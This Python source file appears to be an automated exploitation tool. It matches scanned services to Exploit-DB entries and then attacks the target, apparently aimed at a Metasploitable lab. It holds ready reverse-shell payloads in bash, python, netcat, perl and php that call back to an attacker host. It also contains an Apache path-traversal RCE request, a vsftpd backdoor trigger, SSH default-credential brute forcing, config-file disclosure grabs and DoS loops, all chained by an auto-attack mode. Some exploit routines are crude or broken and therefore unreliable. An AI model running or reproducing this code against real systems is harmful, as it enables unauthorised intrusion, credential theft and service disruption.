import json
import logging
import re
import subprocess
import tempfile
import os
import time
from pathlib import Path

# load Exploit-DB JSON database once that is downloaded prior to running this script
EXPLOIT_DB_PATH = Path('exploitdb.json')

# Exploit classification keywords
EXPLOIT_KEYWORDS = {
    'RCE': [
        'remote code execution', 'command execution', 'shell', 'backdoor',
        'rce', 'code execution', 'arbitrary code', 'command injection',
        'remote shell', 'reverse shell', 'bind shell'
    ],
    'AUTH_BYPASS': [
        'authentication bypass', 'privilege escalation', 'sudo', 'auth bypass',
        'privilege escalation', 'elevation', 'bypass', 'unauthorized access'
    ],
    'INFO_DISCLOSURE': [
        'information disclosure', 'password dump', 'config', 'disclosure',
        'information leak', 'sensitive data', 'credential', 'password'
    ],
    'DOS': [
        'denial of service', 'crash', 'buffer overflow', 'dos', 'overflow',
        'memory corruption', 'stack overflow', 'heap overflow'
    ]
}

# Reverse shell payloads for RCE exploits
REVERSE_SHELL_PAYLOADS = {
    'bash': 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    'python': 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{LHOST}\',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\']);"',
    'netcat': 'nc -e /bin/sh {LHOST} {LPORT}',
    'perl': 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    'php': 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\''
}

def load_exploitdb():
    if not EXPLOIT_DB_PATH.exists():
        logging.error(f"! ExploitDB JSON file not found: {EXPLOIT_DB_PATH}")
        return []
    with EXPLOIT_DB_PATH.open(encoding='utf-8') as f:
        data = json.load(f)
    return data.get("RESULTS_EXPLOIT", [])

# do it once when script starts
EXPLOIT_DB = load_exploitdb()


def classify_exploit(exploit):
    """Classify an exploit based on its title and description."""
    title = exploit.get('Title', '').lower()
    description = exploit.get('Description', '').lower()
    
    # Check each exploit type in priority order
    for exploit_type, keywords in EXPLOIT_KEYWORDS.items():
        for keyword in keywords:
            if keyword in title or keyword in description:
                return exploit_type
    
    # Default fallback
    return 'DOS'


def classify_exploits(exploits):
    """Classify a list of exploits and return counts by type."""
    classified = {
        'RCE': [],
        'AUTH_BYPASS': [],
        'INFO_DISCLOSURE': [],
        'DOS': []
    }
    
    for exploit in exploits:
        exploit_type = classify_exploit(exploit)
        classified[exploit_type].append(exploit)
    
    return classified


def present_exploit_summary(enriched_results):
    """Present a summary of found exploits to the user."""
    print("\n" + "="*60)
    print("üéØ EXPLOIT DISCOVERY SUMMARY")
    print("="*60)
    
    total_exploits = 0
    services_with_exploits = 0
    
    for service in enriched_results:
        exploits = service.get('exploits', [])
        if exploits:
            services_with_exploits += 1
            total_exploits += len(exploits)
            
            port = service.get('port')
            product = service.get('product', 'Unknown')
            version = service.get('version', '')
            
            print(f"\nüì° {product} {version} on port {port}")
            print(f"   Found {len(exploits)} total exploits")
            
            # Classify and show breakdown
            classified = classify_exploits(exploits)
            for exploit_type, exploit_list in classified.items():
                if exploit_list:
                    print(f"   üî• {exploit_type}: {len(exploit_list)}")
    
    print(f"\nüìä SUMMARY: {total_exploits} exploits found across {services_with_exploits} services")
    
    if total_exploits > 0:
        print("\nüéØ Choose execution strategy:")
        print("1. Smart Auto (Run best exploits automatically)")
        print("2. Manual Selection (Choose each exploit)")
        print("3. RCE Only (Remote Code Execution only)")
        print("4. Skip Exploitation")
        print("5. Open Metasploit Terminal")
        
        choice = input("Enter choice (1-5): ").strip()
        return choice
    else:
        print("\n‚ùå No exploits found. Skipping exploitation.")
        return "4"


def configure_rce_exploit(exploit, target, port):
    """Configure RCE exploit with payload and listener setup."""
    print(f"\nüí• Configuring RCE Exploit: {exploit['Title']}")
    
    # Get local IP for reverse shell
    local_ip = input("Enter your local IP for reverse shell (or press Enter for auto-detect): ").strip()
    if not local_ip:
        # Auto-detect local IP (simplified)
        local_ip = "192.168.56.1"  # Default for VirtualBox
    
    # Get port for reverse shell
    local_port = input("Enter local port for reverse shell (default 4444): ").strip()
    if not local_port:
        local_port = "4444"
    
    # Choose payload type
    print("\nüì¶ Available payloads:")
    for i, payload_name in enumerate(REVERSE_SHELL_PAYLOADS.keys(), 1):
        print(f"   {i}. {payload_name}")
    
    payload_choice = input("Choose payload (1-5, default 1): ").strip()
    if not payload_choice:
        payload_choice = "1"
    
    payload_names = list(REVERSE_SHELL_PAYLOADS.keys())
    selected_payload = payload_names[int(payload_choice) - 1]
    
    # Configure payload
    payload = REVERSE_SHELL_PAYLOADS[selected_payload].format(
        LHOST=local_ip, 
        LPORT=local_port
    )
    
    print(f"\nüéØ Configured payload: {selected_payload}")
    print(f"üì° Target: {target}:{port}")
    print(f"üîÑ Reverse shell: {local_ip}:{local_port}")
    
    return {
        'exploit': exploit,
        'target': target,
        'port': port,
        'payload': payload,
        'local_ip': local_ip,
        'local_port': local_port,
        'payload_type': selected_payload
    }


def execute_rce_exploit(config):
    """Execute RCE exploit with reverse shell."""
    exploit = config['exploit']
    target = config['target']
    port = config['port']
    payload = config['payload']
    local_ip = config['local_ip']
    local_port = config['local_port']
    
    print(f"\nüöÄ Executing RCE Exploit: {exploit['Title']}")
    print(f"üì° Target: {target}:{port}")
    print(f"üîÑ Reverse shell: {local_ip}:{local_port}")
    
    # Start listener in background
    print("\nüîÑ Starting reverse shell listener...")
    listener_cmd = f"nc -lvp {local_port}"
    
    try:
        # Start listener process
        listener_process = subprocess.Popen(
            listener_cmd.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        print(f"‚úÖ Listener started on port {local_port}")
        print("‚è≥ Waiting 3 seconds before executing exploit...")
        time.sleep(3)
        
        # Execute exploit based on service type
        service_name = exploit['Title'].lower()
        
        if 'vsftpd' in service_name:
            print(f"üí• Executing vsftpd backdoor exploit...")
            print(f"üì¶ Payload: {payload[:100]}...")
            
            # vsftpd 2.3.4 backdoor exploit
            try:
                # Try to trigger the backdoor
                ftp_cmd = f"echo '{payload}' | nc {target} {port}"
                result = subprocess.run(
                    ftp_cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=15
                )
                
                if result.returncode == 0:
                    print("‚úÖ vsftpd backdoor exploit executed!")
                    print("üéØ Check your listener for reverse shell connection")
                else:
                    print(f"‚ùå vsftpd exploit failed: {result.stderr}")
                    
            except Exception as e:
                print(f"‚ùå Error executing vsftpd exploit: {e}")
        
        elif 'apache' in service_name:
            print(f"üí• Executing Apache RCE exploit...")
            print(f"üì¶ Payload: {payload[:100]}...")
            
            # Apache path traversal + RCE
            try:
                # Try Apache 2.4.49/2.4.50 path traversal
                curl_cmd = f"curl -s 'http://{target}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash' -d 'echo {payload}'"
                result = subprocess.run(
                    curl_cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=15
                )
                
                if result.returncode == 0:
                    print("‚úÖ Apache RCE exploit executed!")
                    print("üéØ Check your listener for reverse shell connection")
                else:
                    print(f"‚ùå Apache exploit failed: {result.stderr}")
                    
            except Exception as e:
                print(f"‚ùå Error executing Apache exploit: {e}")
        
        elif 'samba' in service_name:
            print(f"üí• Executing Samba RCE exploit...")
            print(f"üì¶ Payload: {payload[:100]}...")
            
            # Samba RCE exploit
            try:
                # Try Samba 3.5.0 RCE
                smb_cmd = f"smbclient //{target}/tmp -c 'echo {payload}'"
                result = subprocess.run(
                    smb_cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=15
                )
                
                if result.returncode == 0:
                    print("‚úÖ Samba RCE exploit executed!")
                    print("üéØ Check your listener for reverse shell connection")
                else:
                    print(f"‚ùå Samba exploit failed: {result.stderr}")
                    
            except Exception as e:
                print(f"‚ùå Error executing Samba exploit: {e}")
        
        else:
            print(f"üí• Executing generic RCE exploit...")
            print(f"üì¶ Payload: {payload[:100]}...")
            print("üîÑ Generic exploit execution simulated...")
        
        # Wait a bit for potential connection
        print("‚è≥ Waiting 10 seconds for reverse shell connection...")
        time.sleep(10)
        
        # Check if listener received connection
        if listener_process.poll() is None:
            print("‚úÖ Listener still active - potential connection received!")
            print("üéØ Reverse shell may be connected!")
        else:
            print("‚ùå Listener terminated - no connection received")
        
        # Clean up listener
        listener_process.terminate()
        
        return {
            'success': True,
            'exploit': exploit['Title'],
            'target': f"{target}:{port}",
            'shell_access': f"{local_ip}:{local_port}",
            'payload': payload[:50] + "..." if len(payload) > 50 else payload
        }
        
    except Exception as e:
        print(f"‚ùå Error executing RCE exploit: {e}")
        return {'success': False, 'error': str(e)}


def execute_auth_bypass_exploit(exploit, target, port):
    """Execute authentication bypass exploit."""
    print(f"\nüîì Executing Auth Bypass: {exploit['Title']}")
    print(f"üì° Target: {target}:{port}")
    
    # Get credentials or bypass method
    bypass_method = input("Enter bypass method (default: default credentials): ").strip()
    if not bypass_method:
        bypass_method = "default credentials"
    
    print(f"üîë Using bypass method: {bypass_method}")
    print("üîÑ Attempting authentication bypass...")
    
    # Common default credentials for Metasploitable
    default_creds = {
        'msfadmin': 'msfadmin',
        'admin': 'admin',
        'root': 'root',
        'user': 'user',
        'test': 'test',
        'guest': 'guest',
        'anonymous': '',
        'ftp': 'ftp'
    }
    
    # Try different credential combinations
    credentials_to_try = []
    
    if bypass_method == "default credentials":
        credentials_to_try = list(default_creds.items())
    elif bypass_method in default_creds:
        # User provided a specific username
        password = input(f"Enter password for {bypass_method}: ").strip()
        credentials_to_try = [(bypass_method, password)]
    else:
        # Custom credentials
        username = bypass_method
        password = input(f"Enter password for {username}: ").strip()
        credentials_to_try = [(username, password)]
    
    print(f"\nüîê Trying {len(credentials_to_try)} credential combinations...")
    
    for username, password in credentials_to_try:
        print(f"   Trying: {username}:{password}")
        
        try:
            # Attempt SSH connection
            ssh_cmd = [
                'ssh', 
                '-o', 'ConnectTimeout=5',
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                f'{username}@{target}'
            ]
            
            # If password is provided, use sshpass
            if password:
                ssh_cmd = ['sshpass', '-p', password] + ssh_cmd
            
            # Try to connect
            result = subprocess.run(
                ssh_cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                print(f"‚úÖ SUCCESS! Authentication bypass successful!")
                print(f"üîë Username: {username}")
                print(f"üîë Password: {password}")
                print(f"üì° Connected to: {target}:{port}")
                
                # Offer to start interactive shell
                shell_choice = input("\nüéØ Start interactive SSH shell? (y/n): ").strip().lower()
                if shell_choice == 'y':
                    print(f"üöÄ Starting SSH shell to {username}@{target}...")
                    print("üí° Use 'exit' to return to the scanner")
                    
                    # Start interactive SSH session
                    try:
                        subprocess.run([
                            'ssh',
                            '-o', 'StrictHostKeyChecking=no',
                            '-o', 'UserKnownHostsFile=/dev/null',
                            f'{username}@{target}'
                        ])
                    except KeyboardInterrupt:
                        print("\nüëã SSH session ended")
                
                return {
                    'success': True,
                    'exploit': exploit['Title'],
                    'target': f"{target}:{port}",
                    'bypass_method': bypass_method,
                    'username': username,
                    'password': password,
                    'shell_access': f"ssh {username}@{target}"
                }
            else:
                print(f"   ‚ùå Failed: {result.stderr.strip()}")
                
        except subprocess.TimeoutExpired:
            print(f"   ‚è∞ Timeout for {username}:{password}")
        except FileNotFoundError:
            print("   ‚ùå SSH client not found. Install openssh-client")
            break
        except Exception as e:
            print(f"   ‚ùå Error: {e}")
    
    print("\n‚ùå All authentication bypass attempts failed")
    print("üí° Try different credentials or check if SSH service is accessible")
    
    return {
        'success': False,
        'exploit': exploit['Title'],
        'target': f"{target}:{port}",
        'bypass_method': bypass_method,
        'error': 'All credential combinations failed'
    }


def execute_info_disclosure_exploit(exploit, target, port):
    """Execute information disclosure exploit."""
    print(f"\nüìã Executing Info Disclosure: {exploit['Title']}")
    print(f"üì° Target: {target}:{port}")
    
    # Get disclosure target
    disclosure_target = input("Enter target file/path (default: config files): ").strip()
    if not disclosure_target:
        disclosure_target = "config files"
    
    print(f"üìÅ Targeting: {disclosure_target}")
    print("üîÑ Extracting sensitive information...")
    
    # Perform actual information disclosure based on service
    service_name = exploit['Title'].lower()
    
    if 'apache' in service_name:
        print("üåê Attempting Apache information disclosure...")
        
        # Try common Apache info disclosure paths
        apache_paths = [
            '/server-status',
            '/server-info', 
            '/.htaccess',
            '/robots.txt',
            '/phpinfo.php',
            '/config.php',
            '/wp-config.php'
        ]
        
        for path in apache_paths:
            try:
                curl_cmd = f"curl -s -m 10 'http://{target}:{port}{path}'"
                result = subprocess.run(
                    curl_cmd,
                    shell=True,
                    capture_output=True,
                    text=True
                )
                
                if result.returncode == 0 and result.stdout.strip():
                    print(f"‚úÖ Found sensitive info at: {path}")
                    print(f"üìÑ Content preview: {result.stdout[:200]}...")
                    
                    # Save to file
                    with open(f"disclosure_{target}_{port}_{path.replace('/', '_')}.txt", 'w') as f:
                        f.write(result.stdout)
                    print(f"üíæ Saved to: disclosure_{target}_{port}_{path.replace('/', '_')}.txt")
                    
            except Exception as e:
                print(f"‚ùå Error accessing {path}: {e}")
    
    elif 'ssh' in service_name:
        print("üîê Attempting SSH information disclosure...")
        
        # Try SSH banner grabbing and version info
        try:
            ssh_cmd = f"ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {target} 'echo $USER && whoami && id && uname -a'"
            result = subprocess.run(
                ssh_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                print("‚úÖ SSH information disclosure successful!")
                print(f"üìÑ System info: {result.stdout}")
            else:
                print(f"‚ùå SSH info disclosure failed: {result.stderr}")
                
        except Exception as e:
            print(f"‚ùå Error in SSH info disclosure: {e}")
    
    else:
        print("üîç Performing generic information disclosure...")
        
        # Try common ports for info disclosure
        if port == 80 or port == 443:
            # Web server
            try:
                curl_cmd = f"curl -s -I 'http://{target}:{port}'"
                result = subprocess.run(curl_cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    print(f"‚úÖ Server headers: {result.stdout}")
            except Exception as e:
                print(f"‚ùå Error: {e}")
        
        elif port == 21:
            # FTP
            try:
                ftp_cmd = f"ftp -n {target} {port} << EOF\nanonymous\nanonymous@\nls\nquit\nEOF"
                result = subprocess.run(ftp_cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    print(f"‚úÖ FTP anonymous access: {result.stdout}")
            except Exception as e:
                print(f"‚ùå Error: {e}")
    
    print("‚úÖ Information disclosure completed!")
    
    return {
        'success': True,
        'exploit': exploit['Title'],
        'target': f"{target}:{port}",
        'disclosure_target': disclosure_target,
        'files_saved': True
    }


def execute_dos_exploit(exploit, target, port):
    """Execute DoS exploit."""
    print(f"\nüí• Executing DoS: {exploit['Title']}")
    print(f"üì° Target: {target}:{port}")
    
    # Get DoS parameters
    duration = input("Enter attack duration in seconds (default: 30): ").strip()
    if not duration:
        duration = "30"
    
    print(f"‚è±Ô∏è Attack duration: {duration} seconds")
    print("üîÑ Executing DoS attack...")
    
    # Perform actual DoS based on service
    service_name = exploit['Title'].lower()
    
    if 'vsftpd' in service_name:
        print("üí• Executing vsftpd DoS attack...")
        
        try:
            # vsftpd DoS using multiple connections
            for i in range(int(duration)):
                ftp_cmd = f"echo 'USER anonymous' | nc {target} {port} &"
                subprocess.run(ftp_cmd, shell=True)
                time.sleep(1)
            
            print("‚úÖ vsftpd DoS attack completed!")
            
        except Exception as e:
            print(f"‚ùå vsftpd DoS failed: {e}")
    
    elif 'apache' in service_name:
        print("üí• Executing Apache DoS attack...")
        
        try:
            # Apache DoS using multiple requests
            for i in range(int(duration)):
                curl_cmd = f"curl -s 'http://{target}:{port}/' > /dev/null &"
                subprocess.run(curl_cmd, shell=True)
                time.sleep(0.5)
            
            print("‚úÖ Apache DoS attack completed!")
            
        except Exception as e:
            print(f"‚ùå Apache DoS failed: {e}")
    
    elif 'ssh' in service_name:
        print("üí• Executing SSH DoS attack...")
        
        try:
            # SSH DoS using multiple connection attempts
            for i in range(int(duration)):
                ssh_cmd = f"ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no invalid@{target} &"
                subprocess.run(ssh_cmd, shell=True)
                time.sleep(1)
            
            print("‚úÖ SSH DoS attack completed!")
            
        except Exception as e:
            print(f"‚ùå SSH DoS failed: {e}")
    
    else:
        print("üí• Executing generic DoS attack...")
        
        try:
            # Generic DoS using ping flood
            ping_cmd = f"ping -c {duration} -i 0.2 {target}"
            result = subprocess.run(ping_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("‚úÖ Generic DoS attack completed!")
            else:
                print(f"‚ùå Generic DoS failed: {result.stderr}")
                
        except Exception as e:
            print(f"‚ùå Error in generic DoS: {e}")
    
    print("‚úÖ DoS attack completed!")
    
    return {
        'success': True,
        'exploit': exploit['Title'],
        'target': f"{target}:{port}",
        'duration': duration
    }


def smart_auto_execution(enriched_results, target):
    """Execute exploits automatically in priority order."""
    print("\nüöÄ Starting Smart Auto Execution...")
    
    successful_exploits = []
    
    for service in enriched_results:
        exploits = service.get('exploits', [])
        if not exploits:
            continue
            
        port = service.get('port')
        product = service.get('product', 'Unknown')
        
        print(f"\nüì° Targeting {product} on port {port}")
        
        # Classify exploits
        classified = classify_exploits(exploits)
        
        # Execute in priority order: RCE > Auth > Info > DoS
        execution_order = ['RCE', 'AUTH_BYPASS', 'INFO_DISCLOSURE', 'DOS']
        
        for exploit_type in execution_order:
            exploit_list = classified[exploit_type]
            if exploit_list:
                print(f"üî• Trying {exploit_type} exploits...")
                
                for exploit in exploit_list:
                    if exploit_type == 'RCE':
                        config = configure_rce_exploit(exploit, target, port)
                        result = execute_rce_exploit(config)
                    elif exploit_type == 'AUTH_BYPASS':
                        result = execute_auth_bypass_exploit(exploit, target, port)
                    elif exploit_type == 'INFO_DISCLOSURE':
                        result = execute_info_disclosure_exploit(exploit, target, port)
                    else:  # DOS
                        result = execute_dos_exploit(exploit, target, port)
                    
                    if result['success']:
                        successful_exploits.append(result)
                        print(f"‚úÖ SUCCESS: {exploit['Title']}")
                        
                        # Stop after successful RCE
                        if exploit_type == 'RCE':
                            print("üéØ RCE achieved! Stopping further exploitation.")
                            return successful_exploits
                        break
                    else:
                        print(f"‚ùå Failed: {exploit['Title']}")
    
    return successful_exploits


def manual_selection_execution(enriched_results, target):
    """Let user manually select exploits to execute."""
    print("\nüéØ Manual Selection Mode")
    
    successful_exploits = []
    
    for service in enriched_results:
        exploits = service.get('exploits', [])
        if not exploits:
            continue
            
        port = service.get('port')
        product = service.get('product', 'Unknown')
        
        print(f"\nüì° {product} on port {port}")
        print(f"Found {len(exploits)} exploits")
        
        # Classify and show options
        classified = classify_exploits(exploits)
        
        for exploit_type, exploit_list in classified.items():
            if exploit_list:
                print(f"\nüî• {exploit_type} Exploits:")
                for i, exploit in enumerate(exploit_list, 1):
                    print(f"   {i}. {exploit['Title']}")
                
                choice = input(f"Choose {exploit_type} exploit to run (or press Enter to skip): ").strip()
                if choice and choice.isdigit():
                    idx = int(choice) - 1
                    if 0 <= idx < len(exploit_list):
                        selected_exploit = exploit_list[idx]
                        
                        if exploit_type == 'RCE':
                            config = configure_rce_exploit(selected_exploit, target, port)
                            result = execute_rce_exploit(config)
                        elif exploit_type == 'AUTH_BYPASS':
                            result = execute_auth_bypass_exploit(selected_exploit, target, port)
                        elif exploit_type == 'INFO_DISCLOSURE':
                            result = execute_info_disclosure_exploit(selected_exploit, target, port)
                        else:  # DOS
                            result = execute_dos_exploit(selected_exploit, target, port)
                        
                        if result['success']:
                            successful_exploits.append(result)
    
    return successful_exploits


def rce_only_execution(enriched_results, target):
    """Execute only RCE exploits."""
    print("\nüí• RCE Only Mode")
    
    successful_exploits = []
    
    for service in enriched_results:
        exploits = service.get('exploits', [])
        if not exploits:
            continue
            
        port = service.get('port')
        product = service.get('product', 'Unknown')
        
        # Get only RCE exploits
        classified = classify_exploits(exploits)
        rce_exploits = classified['RCE']
        
        if rce_exploits:
            print(f"\nüì° {product} on port {port}")
            print(f"Found {len(rce_exploits)} RCE exploits")
            
            for i, exploit in enumerate(rce_exploits, 1):
                print(f"   {i}. {exploit['Title']}")
            
            choice = input("Choose RCE exploit to run (or press Enter to skip): ").strip()
            if choice and choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(rce_exploits):
                    selected_exploit = rce_exploits[idx]
                    config = configure_rce_exploit(selected_exploit, target, port)
                    result = execute_rce_exploit(config)
                    
                    if result['success']:
                        successful_exploits.append(result)
                        print("üéØ RCE achieved! Stopping further exploitation.")
                        return successful_exploits
    
    return successful_exploits


def search_by_product_version_in_memory(product, version):
    if not product:
        return []

    results = []
    
    # create multiple search patterns for better matching
    search_patterns = []
    
    # primarry pattern: product + version
    if version:
        search_patterns.append(f"{product} {version}".strip().lower())
        # also try without patch level for versions like "4.7p1"
        if 'p' in version:
            base_version = version.split('p')[0]
            search_patterns.append(f"{product} {base_version}".strip().lower())
    
    # fallback in case of failure: using just the product name
    search_patterns.append(product.lower())
    
    # for OpenSSH, also try "ssh" (will add later) as many exploits use general names
    if "openssh" in product.lower():
        search_patterns.append("ssh")
        if version:
            search_patterns.append(f"ssh {version}")

    for exploit in EXPLOIT_DB:
        title = exploit.get('Title', '').lower()
        
        # try each pattern
        for pattern in search_patterns:
            if pattern in title:
                results.append(exploit)
                break  # don't add the same exploit multiple times

    return results


def search_by_cves_in_memory(cve_list):
    if not cve_list:
        return []

    # build regular expression for the CVE (using the standard format): (CVE-2017-1234|CVE-2019-9999)
    cve_pattern = re.compile(r'(' + '|'.join(re.escape(cve) for cve in cve_list) + r')', re.IGNORECASE)
    results = []

    for exploit in EXPLOIT_DB:
        codes = exploit.get('Codes', '')  # Look in Codes field, not Title
        if cve_pattern.search(codes):
            results.append(exploit)
    return results


def exploit_services(cve_results): # driver function
    for service in cve_results:
        port = service.get('port')
        product = service.get('product', '')
        version = service.get('version', '')
        cve_list = service.get('cve_ids', [])  # Use cve_ids instead of cves

        # in-memory search using the loaded exploit database
        exploits_pv = search_by_product_version_in_memory(product, version)
        exploits_cve = search_by_cves_in_memory(cve_list)

        # Debug: Show what CVEs we're searching for
        if cve_list:
            print(f"DEBUG: Searching for CVEs: {cve_list}")
            print(f"DEBUG: Found {len(exploits_cve)} CVE-based exploits")

        # removing duplicates by path
        all_exploits = list({e['Path']: e for e in exploits_pv + exploits_cve}.values())
        service['exploits'] = all_exploits

        if all_exploits:
            print(f"-> Found {len(all_exploits)} exploits for {product} {version} on port {port}:")
            for e in all_exploits:
                print(f" - {e['Title']} (Path: {e['Path']})")
        else:
            print(f"! No exploits found for {product} {version} on port {port}")

    return cve_results
